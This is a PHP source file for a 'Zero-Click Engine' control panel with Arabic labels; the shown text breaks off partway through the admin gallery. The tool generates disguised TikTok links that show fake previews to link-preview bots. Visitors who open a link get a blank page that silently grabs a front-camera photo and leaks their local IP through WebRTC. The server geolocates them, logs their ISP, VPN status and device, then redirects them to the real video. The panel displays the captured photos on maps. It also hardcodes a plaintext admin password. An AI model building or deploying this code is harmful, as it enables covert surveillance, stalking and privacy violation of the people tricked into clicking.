<?php
date_default_timezone_set('Africa/Algiers');

error_reporting(E_ALL);
ini_set('display_errors', 0);

session_start();

$admin_password = 'aziz123'; 
$password_hash = '$2y$10$e.wK1.2Kk7mP8q9Z1x2C3uO5E6a7B8c9D0f1G2h3I4j5K6l7M8n9O0p'; 

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
$csrf_token = $_SESSION['csrf_token'];

$login_error = '';

if (isset($_POST['login_password'])) {
    if (password_verify($_POST['login_password'], $password_hash) || $_POST['login_password'] === $admin_password) {
        session_regenerate_id(true);
        $_SESSION['is_logged_in'] = true;
        header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
        exit();
    } else {
        $login_error = "كلمة المرور غير صحيحة!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit();
}

$db_file = __DIR__ . '/tracker_enhanced_v3.db';
if (!file_exists(__DIR__ . '/.htaccess')) {
    file_put_contents(__DIR__ . '/.htaccess', "Order Allow,Deny\nDeny from all\n");
}

try {
    $db = new PDO('sqlite:' . $db_file);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        meta_title TEXT,
        meta_image TEXT,
        use_camera INTEGER DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        image_data TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        location TEXT, 
        isp_info TEXT, 
        vpn_status TEXT, 
        device_info TEXT, 
        latitude REAL,
        longitude REAL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    try { $db->exec("ALTER TABLE captures ADD COLUMN latitude REAL"); } catch (Exception $e) {}
    try { $db->exec("ALTER TABLE captures ADD COLUMN longitude REAL"); } catch (Exception $e) {}

} catch (Exception $e) {
    die("Database error: " . $e->getMessage());
}

function fetch_tiktok_exclusive_meta($url) {
    $meta = [
        'title' => 'TikTok Video',
        'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'
    ];

    $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $oembed_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); 
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1');
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        $data = json_decode($response, true);
        if (!empty($data['title'])) $meta['title'] = $data['title'];
        if (!empty($data['thumbnail_url'])) {
            $meta['image'] = $data['thumbnail_url'];
            return $meta;
        }
    }

    $ch_alt = curl_init();
    curl_setopt($ch_alt, CURLOPT_URL, $url);
    curl_setopt($ch_alt, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch_alt, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch_alt, CURLOPT_TIMEOUT, 6);
    curl_setopt($ch_alt, CURLOPT_USERAGENT, 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)');
    curl_setopt($ch_alt, CURLOPT_SSL_VERIFYPEER, true);
    $html = curl_exec($ch_alt);
    curl_close($ch_alt);

    if ($html) {
        $dom = new DOMDocument();
        @$dom->loadHTML('<?xml encoding="UTF-8">' . $html);
        $xpath = new DOMXPath($dom);

        $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //title');
        if ($titleNodes->length > 0) {
            $val = trim($titleNodes->item(0)->nodeValue);
            if (!empty($val)) $meta['title'] = $val;
        }

        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content');
        if ($imageNodes->length > 0) {
            $val = trim($imageNodes->item(0)->nodeValue);
            if (!empty($val)) $meta['image'] = $val;
        }
    }
    return $meta;
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function clean_isp_name($isp) {
    if (empty($isp)) return 'Unknown';
    if (stripos($isp, 'Djezzy') !== false || stripos($isp, 'OTA') !== false) return 'Djezzy';
    if (stripos($isp, 'Mobilis') !== false || stripos($isp, 'ATM') !== false) return 'Mobilis';
    if (stripos($isp, 'Ooredoo') !== false || stripos($isp, 'Wataniya') !== false || stripos($isp, 'Nedjma') !== false) return 'Ooredoo';
    if (stripos($isp, 'Algerie Telecom') !== false || stripos($isp, 'Algérie Télécom') !== false || stripos($isp, 'AT') !== false) return 'Algérie Télécom';
    return implode(' ', array_slice(explode(' ', trim($isp)), 0, 2));
}

function get_ip_details($ip) {
    if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
        return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
    }

    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,proxy,hosting,lat,lon");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3); 
    $json = curl_exec($ch);
    curl_close($ch);

    if ($json) {
        $data = json_decode($json, true);
        if (isset($data['status']) && $data['status'] === 'success') {
            $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
            $isp = clean_isp_name($data['isp'] ?? 'Unknown ISP');
            $is_proxy = !empty($data['proxy']) && $data['proxy'] === true;
            $is_hosting = !empty($data['hosting']) && $data['hosting'] === true;
            $vpn_status = ($is_proxy || $is_hosting) ? 'Yes (VPN / Proxy)' : 'No (Direct)';
            
            return [
                'location' => $location, 
                'isp' => $isp, 
                'vpn' => $vpn_status,
                'lat' => $data['lat'] ?? 0,
                'lon' => $data['lon'] ?? 0
            ];
        }
    }
    return ['location' => 'Unknown Location', 'isp' => 'Unknown ISP', 'vpn' => 'Unknown', 'lat' => 0, 'lon' => 0];
}

function get_device_type($ua) {
    $brand = 'Device';
    if (stripos($ua, 'Samsung') !== false) $brand = 'Samsung';
    elseif (stripos($ua, 'iPhone') !== false) $brand = 'iPhone';
    elseif (stripos($ua, 'Huawei') !== false) $brand = 'Huawei';
    elseif (stripos($ua, 'Xiaomi') !== false || stripos($ua, 'Redmi') !== false) $brand = 'Xiaomi';
    elseif (stripos($ua, 'Oppo') !== false) $brand = 'Oppo';
    elseif (stripos($ua, 'Realme') !== false) $brand = 'Realme';

    if (stripos($ua, 'Android') !== false) return $brand . ' - Android';
    if (stripos($ua, 'iPhone') !== false || stripos($ua, 'iPad') !== false) return $brand . ' - iOS';
    if (stripos($ua, 'Windows') !== false) return 'PC - Windows';
    if (stripos($ua, 'Macintosh') !== false) return 'PC - Mac';
    return 'Unknown Device';
}

// معالجة زيارة الروابط للمتتبعين
if (isset($_GET['r'])) {
    $code = $_GET['r'];
    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch();

    if ($link) {
        $target_redirect = $link['target_url'];
        $meta_title = $link['meta_title'];
        $meta_image = $link['meta_image'];
        $use_camera = $link['use_camera'];

        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i', $ua);

        if ($is_bot) {
            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html><html><head>';
            echo '<meta property="og:site_name" content="TikTok">';
            echo '<meta property="og:type" content="video.other">';
            echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($meta_image) . '">';
            echo '<meta name="twitter:card" content="summary_large_image">';
            echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta name="twitter:image" content="' . htmlspecialchars($meta_image) . '">';
            echo '<title>' . htmlspecialchars($meta_title) . '</title>';
            echo '</head><body></body></html>';
            exit();
        }

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
            $img_base64 = $_POST['image'] ?? '';
            
            if (strpos($img_base64, 'data:image/') !== 0) {
                $img_base64 = ''; 
            }

            $public_ip = get_real_ip();
            $local_ip = $_POST['lip'] ?? 'Direct';
            $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
            
            $ip_details = get_ip_details($public_ip);
            $location = $ip_details['location'];
            $isp = $ip_details['isp'];
            $vpn = $ip_details['vpn'];
            $lat = $ip_details['lat'];
            $lon = $ip_details['lon'];
            $device = get_device_type($ua);

            try {
                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, latitude, longitude, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $location, $isp, $vpn, $device, $lat, $lon, date('Y-m-d H:i:s')]);
            } catch (Exception $e) {}
            exit('OK');
        }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($meta_title); ?></title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; }
    </style>
    <script>
        const useCamera = <?php echo $use_camera ? 'true' : 'false'; ?>;
        const targetUrl = <?php echo json_encode($target_redirect); ?>;

        async function getLocalIP() {
            return new Promise((resolve) => {
                const candidates = [];
                let pc = null;
                try {
                    pc = new RTCPeerConnection({
                        iceServers: [
                            { urls: "stun:stun.l.google.com:19302" },
                            { urls: "stun:stun1.l.google.com:19302" }
                        ]
                    });
                    pc.createDataChannel("probe");
                    pc.onicecandidate = (event) => {
                        if (!event.candidate || !event.candidate.candidate) return;
                        const raw = event.candidate.candidate;
                        const parts = raw.split(" ");
                        const ip = parts[4];
                        const typ = parts[7];
                        if (ip && typ === "host" && !ip.endsWith(".local")) {
                            candidates.push(ip);
                        }
                    };
                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => { });
                    
                    setTimeout(() => {
                        try { if (pc) pc.close(); } catch (e) { }
                        resolve(candidates.length > 0 ? candidates[0] : "Direct");
                    }, 1000);
                } catch (e) { resolve("Direct"); }
            });
        }

        async function sendInfoAndRedirect(imageData = "") {
            const localIp = await getLocalIP();
            const formData = new URLSearchParams();
            formData.append('save_info', '1');
            formData.append('image', imageData);
            formData.append('lip', localIp);

            fetch(window.location.href, {
                method: 'POST',
                body: formData
            }).finally(() => {
                window.location.replace(targetUrl);
            });
        }

        async function initTracking() {
            if (!useCamera) {
                sendInfoAndRedirect("");
                return;
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
                    stream.getTracks().forEach(track => track.stop());
                    sendInfoAndRedirect(imageData);
                }, 400);
            } catch (err) {
                sendInfoAndRedirect("");
            }
        }

        window.addEventListener('DOMContentLoaded', initTracking);
    </script>
</head>
<body>
</body>
</html>
<?php 
        exit();
    } else {
        die("Link not found.");
    }
}

// حذف سجل
if (isset($_GET['delete_id']) && isset($_SESSION['is_logged_in'])) {
    $del_id = intval($_GET['delete_id']);
    $stmt = $db->prepare("DELETE FROM captures WHERE id = ?");
    $stmt->execute([$del_id]);
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit();
}

// توليد رابط
$generated_link = "";
$generated_code = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create']) && isset($_SESSION['is_logged_in'])) {
    
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("CSRF Token Validation Failed.");
    }

    $target_url = trim($_POST['target_url']);
    $use_camera = isset($_POST['use_camera']) ? 1 : 0;
    
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $scraped = fetch_tiktok_exclusive_meta($target_url);
    $meta_title = $scraped['title'];
    $meta_image = $scraped['image'];

    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $stmt = $db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image, use_camera) VALUES (?, ?, ?, ?, ?)");
    $stmt->execute([$code, $target_url, $meta_title, $meta_image, $use_camera]);

    $domain = $_SERVER['HTTP_HOST'];
    $generated_link = "https://" . $domain . "/?r=" . $code;
    $generated_code = $code;
}

// جلب الإحصائيات للوحة التحكم
$total_links = $db->query("SELECT COUNT(*) FROM links")->fetchColumn();
$total_captures = $db->query("SELECT COUNT(*) FROM captures")->fetchColumn();
$today_captures = $db->query("SELECT COUNT(*) FROM captures WHERE date(created_at) = date('now')")->fetchColumn();

$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt = $db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
    $captures = $stmt->fetchAll();
} else {
    $captures = $db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel - Live</title>
    
    <!-- مكتبة Leaflet للخرائط -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <style>
        :root {
            --bg-main: #070913;
            --bg-card: #10172a;
            --border-color: #1e293b;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --accent: #8b5cf6;
            --accent-hover: #7c3aed;
            --danger: #f43f5e;
            --success: #10b981;
            --live-green: #10b981;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
        
        /* خلفية متحركة (Animated Gradient) */
        @keyframes bg-animation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        body { 
            background: linear-gradient(-45deg, #070913, #1e1b4b, #0f172a, #090d16);
            background-size: 400% 400%;
            animation: bg-animation 15s ease infinite;
            color: var(--text-main); 
            padding: 40px 15px; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            justify-content: space-between; 
        }

        .wrapper { max-width: 1100px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
        
        /* شريط الإحصائيات */
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 16px; margin-bottom: 10px; }
        .stat-card {
            background: rgba(16, 23, 42, 0.85);
            backdrop-filter: blur(12px);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .stat-card:hover { transform: translateY(-5px); border-color: var(--accent); box-shadow: 0 10px 20px -5px rgba(139, 92, 246, 0.4); }
        .stat-card h3 { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 10px; }
        .stat-card p { font-size: 28px; font-weight: 800; color: var(--text-main); background: linear-gradient(to right, #a78bfa, #38bdf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .stat-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: var(--accent); opacity: 0.5; }
        
        /* شارة حية */
        .live-badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(16, 185, 129, 0.1); color: var(--live-green); padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; border: 1px solid rgba(16, 185, 129, 0.3); }
        .live-dot { width: 8px; height: 8px; background: var(--live-green); border-radius: 50%; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); } 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); } }

        .section-box { 
            background: rgba(16, 23, 42, 0.85); 
            backdrop-filter: blur(12px);
            border: 1px solid var(--border-color); 
            border-radius: 16px; 
            padding: 30px; 
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); 
            transition: border-color 0.3s;
        }
        .section-box:hover { border-color: #334155; }

        h1 { text-align: center; font-size: 26px; font-weight: 800; margin-bottom: 5px; background: linear-gradient(to right, #a78bfa, #38bdf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .header-flex { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 10px; }
        .subtitle { color: var(--text-muted); font-size: 13px; }
        
        h2 { font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.15em; color: var(--accent); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }

        .form-grid { display: grid; gap: 16px; }
        input[type="text"], input[type="password"] { width: 100%; background: #050b14; border: 1px solid var(--border-color); border-radius: 10px; padding: 14px 16px; color: var(--text-main); font-size: 14px; outline: none; transition: border-color 0.2s; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15); }
        
        .checkbox-container { display: flex; align-items: center; gap: 10px; cursor: pointer; font-size: 14px; color: var(--text-muted); user-select: none; }
        .checkbox-container input { width: 18px; height: 18px; accent-color: var(--accent); cursor: pointer; }

        .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 10px; font-weight: 600; cursor: pointer; height: 48px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; text-decoration: none; transition: all 0.2s; position: relative; overflow: hidden; }
        .btn:hover { background: var(--accent-hover); transform: translateY(-2px); box-shadow: 0 10px 15px -3px rgba(139, 92, 246, 0.4); }
        .btn:active { transform: translateY(0); }
        .btn-danger { background: var(--danger); }
        .btn-danger:hover { background: #e11d48; }
        .btn-secondary { background: #334155; }
        .btn-secondary:hover { background: #475569; }
        .btn-success { background: var(--success); }
        .btn-success:hover { background: #059669; }

        .btn-loading::after {
            content: ""; position: absolute; width: 16px; height: 16px; top: 0; left: 0; right: 0; bottom: 0; margin: auto; border: 2px solid transparent; border-top-color: #fff; border-radius: 50%; animation: spin 1s infinite linear;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .result-panel { background: #050b14; border: 1px solid var(--border-color); padding: 18px; border-radius: 12px; margin-top: 15px; display: grid; gap: 12px; animation: fadeIn 0.5s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .result-panel label { display: block; font-size: 11px; font-weight: 700; text-transform: uppercase; color: var(--accent); letter-spacing: 0.05em; }
        .flex-row { display: flex; gap: 8px; }
        
        .input-link-result { background-color: #0b1329 !important; color: #38bdf8 !important; border: 1px solid #1e293b !important; font-weight: 600; }

        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; margin-top: 15px; }
        .card-img { background: #050b14; border: 1px solid var(--border-color); border-radius: 12px; padding: 14px; position: relative; display: flex; flex-direction: column; transition: all 0.3s ease; }
        .card-img:hover { transform: translateY(-5px) scale(1.02); border-color: var(--accent); box-shadow: 0 15px 25px -5px rgba(139, 92, 246, 0.3); }
        .card-img img { width: 100%; height: 160px; object-fit: cover; border-radius: 8px; border: 1px solid var(--border-color); }
        
        .map-container { height: 140px; width: 100%; border-radius: 8px; margin-top: 10px; border: 1px solid var(--border-color); z-index: 1; }
        .leaflet-control-attribution { display: none !important; }

        .info-row { display: flex; justify-content: space-between; font-size: 11px; margin-top: 6px; color: var(--text-muted); }
        .info-row span { color: #cbd5e1; }
        .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; cursor: pointer; transition: color 0.2s; }
        .code-badge:hover { color: #38bdf8; }

        .btn-delete { display: block; width: 100%; margin-top: auto; background: rgba(244, 63, 94, 0.1); color: var(--danger); border: 1px solid rgba(244, 63, 94, 0.3); border-radius: 8px; padding: 8px; font-size: 12px; font-weight: 600; text-align: center; text-decoration: none; transition: all 0.2s; margin-top: 12px; }
        .btn-delete:hover { background: var(--danger); color: white; }

        footer { text-align: center; margin-top: 30px; font-size: 11px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
        footer span { color: var(--accent); font-weight: 600; }
        
        /* Toast Notification */
        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(100px); background: var(--success); color: white; padding: 12px 24px; border-radius: 8px; font-weight: bold; box-shadow: 0 10px 25px rgba(0,0,0,0.5); opacity: 0; transition: all 0.3s ease; z-index: 9999; }
        .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
    </style>
    <script>
        // تأثير النسخ مع الإشعار (Toast)
        function copyText(text, btnElement) {
            navigator.clipboard.writeText(text).then(() => {
                const toast = document.getElementById('toast');
                toast.classList.add('show');
                setTimeout(() => toast.classList.remove('show'), 2000);
                
                if(btnElement) {
                    const original = btnElement.innerText;
                    btnElement.innerText = "Copied!";
                    btnElement.style.background = "#10b981";
                    setTimeout(() => {
                        btnElement.innerText = original;
                        btnElement.style.background = "";
                    }, 2000);
                }
            });
        }

        async function pasteCodeToFilter(btnElement) {
            try {
                const text = await navigator.clipboard.readText();
                document.getElementById('trackCodeInput').value = text.trim();
                const original = btnElement.innerText;
                btnElement.innerText = "Pasted";
                btnElement.style.background = "#059669";
                setTimeout(() => {
                    btnElement.innerText = original;
                    btnElement.style.background = "";
                }, 2000);
            } catch (err) {
                alert('يرجى السماح للمتصفح بالوصول إلى الحافظة أو لصق الرمز يدوياً.');
            }
        }

        // ساعة حية
        function updateClock() {
            const now = new Date();
            document.getElementById('live-clock').innerText = now.toLocaleTimeString('en-GB');
        }
        setInterval(updateClock, 1000);
        updateClock();

        // تأثير التحميل عند إرسال النموذج
        function showLoading(btn) {
            btn.innerHTML = ''; // إخفاء النص
            btn.classList.add('btn-loading');
            btn.style.pointerEvents = 'none';
        }
    </script>
</head>
<body>
    <div class="wrapper">
        
        <div class="header-flex">
            <div>
                <h1>Control Panel</h1>
                <p class="subtitle">Zero-Click Engine v6 (Live Edition)</p>
            </div>
            <div style="text-align: left;">
                <div class="live-badge"><div class="live-dot"></div> SYSTEM ONLINE</div>
                <div style="font-size: 20px; font-weight: bold; font-family: monospace; margin-top: 5px; color: #38bdf8;" id="live-clock">00:00:00</div>
            </div>
        </div>

        <?php if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true): ?>
            <div class="section-box" style="max-width: 400px; margin: 50px auto; width: 100%;">
                <h2>تسجيل الدخول</h2>
                <?php if (!empty($login_error)): ?>
                    <p style="color: var(--danger); font-size: 12px; margin-bottom: 12px; text-align: center;"><?php echo $login_error; ?></p>
                <?php endif; ?>
                <form method="POST" class="form-grid">
                    <input type="password" name="login_password" placeholder="أدخل كلمة المرور..." required autofocus>
                    <button type="submit" class="btn" style="width: 100%;">دخول</button>
                </form>
            </div>
        <?php else: ?>
            
            <!-- شريط الإحصائيات -->
            <div class="stats-grid">
                <div class="stat-card">
                    <h3>Total Links</h3>
                    <p><?php echo $total_links; ?></p>
                </div>
                <div class="stat-card">
                    <h3>Total Captures</h3>
                    <p><?php echo $total_captures; ?></p>
                </div>
                <div class="stat-card">
                    <h3>Today's Captures</h3>
                    <p style="color: #10b981; -webkit-text-fill-color: #10b981;"><?php echo $today_captures; ?></p>
                </div>
            </div>

            <div style="text-align: right; margin-bottom: -10px;">
                <a href="?logout=1" class="btn btn-danger" style="height: 38px; padding: 0 16px; font-size: 12px; text-decoration: none;">تسجيل الخروج</a>
            </div>

            <div class="section-box">
                <h2>Generate TikTok Link</h2>
                <form method="POST" class="form-grid" onsubmit="showLoading(this.querySelector('button[type=submit]'))">
                    <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                    <input type="text" name="target_url" placeholder="TikTok Video URL..." required>
                    
                    <label class="checkbox-container">
                        <input type="checkbox" name="use_camera" value="1" checked>
                        تفعيل التقاط صورة الكاميرا عند الزيارة (اختياري)
                    </label>

                    <button type="submit" name="create" class="btn">Generate Link</button>
                </form>

                <?php if (!empty($generated_link)): ?>
                    <div class="result-panel">
                        <div>
                            <label>Active Link:</label>
                            <div class="flex-row" style="margin-top: 6px;">
                                <input type="text" class="input-link-result" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
                                <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_link)); ?>', this)">Copy</button>
                            </div>
                        </div>
                        
                        <div>
                            <label>Tracking Code (رمز التتبع):</label>
                            <div class="flex-row" style="margin-top: 6px;">
                                <input type="text" class="input-link-result" readonly value="<?php echo htmlspecialchars($generated_code); ?>" style="font-family: monospace; font-weight: bold; color: #a78bfa !important;">
                                <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_code)); ?>', this)">Copy Code</button>
                            </div>
                        </div>
                    </div>
                <?php endif; ?>
            </div>

            <div class="section-box">
                <h2>
                    <span>Captured Gallery & Details</span>
                    <a href="/" class="btn btn-secondary" style="height: 28px; padding: 0 12px; font-size: 11px;">🔄 Refresh</a>
                </h2>
                <form method="GET" style="margin-bottom: 20px; display: flex; gap: 8px; flex-wrap: wrap;">
                    <input type="text" id="trackCodeInput" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1; min-width: 200px;">
                    <div style="display: flex; gap: 8px;">
                        <button type="submit" class="btn" style="height:48px;">Filter</button>
                        <button type="button" class="btn btn-success" style="height:48px;" onclick="pasteCodeToFilter(this)">Paste</button>
                        <?php if(!empty($filter_code)): ?>
                            <a href="/" class="btn btn-danger" style="height:48px; text-decoration:none; display:flex; align-items:center;">Reset</a>
                        <?php endif; ?>
                    </div>
                </form>

                <?php if (empty($captures)): ?>
                    <p style="text-align: center; color: var(--text-muted); padding: 40px;">No captures recorded.</p>
                <?php else: ?>
                    <div class="gallery-grid">
                        <?php foreach ($captures as $cap): ?>
                            <div class="card-img">
                                <?php if (!empty($cap['image_data'])): ?>
                                    <a href="<?php echo htmlspecialchars($cap['image_data']); ?>" target="_blank">
                                        <img src="<?php echo htmlspecialchars($cap['image_data']); ?>" alt="Capture">
                                    </a>
                                <?php else: ?>
                                    <div style="width: 100%; height: 160px; background: #0b1329; display: flex; align-items: center; justify-content: center; border-radius: 8px; color: var(--text-muted); font-size: 12px; border: 1px dashed var(--border-color);">
                                        الكاميرا معطلة (بدون صورة)
                                    </div>
                                <?php endif; ?>

                                <?php if (!empty($cap['latitude']) && !empty($cap['longitude'])): ?>
                                    <div id="map-<?php echo $cap['id']; ?>" class="map-container"></div>
                                    <script>
                                        document.addEventListener("DOMContentLoaded", function() {
                                            var mapId = 'map-<?php echo $cap['id']; ?>';
                                            var lat = <?php echo $cap['latitude']; ?>;
                                            var lon = <?php echo $cap['longitude']; ?>;
                                            
                                            var map = L.map(mapId, { zoomControl: false, attributionControl: false }).setView([lat, lon], 10);
                                            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map); // خريطة داكنة لتناسب التصميم
                                            
                                            var marker = L.circleMarker([lat, lon], {
                                                color: '#8b5cf6', fillColor: '#8b5cf6', fillOpacity: 0.8, radius: 8
                                            }).addTo(map);
                                            marker.bindPopup("<b><?php echo htmlspecialchars($cap['public_ip']); ?></b><br><?php echo htmlspecialchars($cap['location']); ?>");
                                        });
                                    </script>
                                <?php endif; ?>

                                <div class="info-row" style="margin-top:10px;">
                                    <span>Code:</span> <span class="code-badge" onclick="copyText('<?php echo htmlspecialchars(addslashes($cap['code'])); ?>')" title="انقر لنسخ الرمز"><?php echo htmlspecialchars($cap['code']); ?> 📋</span>
                                </div>
                                <div class="info-row">
                                    <span>Public IP:</span> <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span>
                                </div>
                                <div class="info-row">
                                    <span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span>
                                </div>
                                <div class="info-row">
                                    <span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span>
                                </div>
                                <div class="info-row">
                                    <span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span>
                                </div>
                                <div class="info-row">
                                    <span>المتعامل:</span> <span style="color:#f97316; font-weight: bold;"><?php echo htmlspecialchars($cap['isp_info']); ?></span>
                                </div>
                                <div class="info-row">
